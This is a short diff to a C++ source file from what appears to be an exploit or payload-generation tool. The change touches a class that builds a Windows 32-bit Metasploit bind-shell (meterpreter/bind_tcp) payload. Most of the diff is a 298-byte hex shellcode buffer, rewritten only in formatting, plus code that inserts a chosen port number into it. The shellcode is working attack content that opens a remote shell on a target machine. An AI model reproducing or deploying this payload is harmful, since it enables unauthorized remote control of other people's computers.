@@ -109,38 +109,39 @@ bool Windows_MSF_Shell_Bind_32::decode()
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
 bool Windows_MSF_Shell_Bind_32::initPayload()
 {
-    string hex_port = Utils::OptParser::toHex(port);
+    string hex_port = Utils::OptParser::UintToHexStr(port);
 	
-    /**
-     * windows/meterpreter/bind_tcp - 298 bytes (stage 1) \n
-     * http://www.metasploit.com \n
-     * VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process, \n
-     * AutoLoadStdapi=true, InitialAutoRunScript=, AutoRunScript=, \n
-     * AutoSystemInfo=true, EnableUnicodeEncoding=true \n
+    /*
+     * windows/meterpreter/bind_tcp - 298 bytes (stage 1)
+     * http://www.metasploit.com
+     * VERBOSE=false, LPORT=4444, RHOST=,
+     * EnableStageEncoding=false, PrependMigrate=false,
+     * EXITFUNC=thread, AutoLoadStdapi=true, InitialAutoRunScript=,
+     * AutoRunScript=, AutoSystemInfo=true,
+     * EnableUnicodeEncoding=true
      */
     unsigned char buf[] =
-		"fce8890000006089e531d2648b5230"
-        "8b520c8b52148b72280fb74a2631ff"
-        "31c0ac3c617c022c20c1cf0d01c7e2"
-        "f052578b52108b423c01d08b407885"
-        "c0744a01d0508b48188b582001d3e3"
-        "3c498b348b01d631ff31c0acc1cf0d"
-        "01c738e075f4037df83b7d2475e258"
-        "8b582401d3668b0c4b8b581c01d38b"
-		"048b01d0894424245b5b61595a51ff"
-        "e0585f5a8b12eb865d683332000068"
-		"7773325f54684c772607ffd5b89001"
-        "000029c454506829806b00ffd55050"
-        "50504050405068ea0fdfe0ffd59731"
-        "db53680200115c89e66a10565768c2"
-        "db3767ffd5535768b7e938ffffd553"
-        "53576874ec3be1ffd5579768756e4d"
-        "61ffd56a006a0456576802d9c85fff"
-        "d58b366a406800100000566a006858"
-        "a453e5ffd593536a005653576802d9"
-        "c85fffd501c329c685f675ecc3"
-		;
-		
+    "fce8890000006089e531d2648b5230"
+    "8b520c8b52148b72280fb74a2631ff"
+    "31c0ac3c617c022c20c1cf0d01c7e2"
+    "f052578b52108b423c01d08b407885"
+    "c0744a01d0508b48188b582001d3e3"
+    "3c498b348b01d631ff31c0acc1cf0d"
+    "01c738e075f4037df83b7d2475e258"
+    "8b582401d3668b0c4b8b581c01d38b"
+    "048b01d0894424245b5b61595a51ff"
+    "e0585f5a8b12eb865d683332000068"
+    "7773325f54684c772607ffd5b89001"
+    "000029c454506829806b00ffd55050"
+    "50504050405068ea0fdfe0ffd59731"
+    "db53680200115c89e66a10565768c2"
+    "db3767ffd5535768b7e938ffffd553"
+    "53576874ec3be1ffd5579768756e4d"
+    "61ffd56a006a0456576802d9c85fff"
+    "d58b366a406800100000566a006858"
+    "a453e5ffd593536a005653576802d9"
+    "c85fffd501c329c685f675ecc3";
+
     int buf_len = 298*2;
 	
 	int pos = 13*30 + 10;
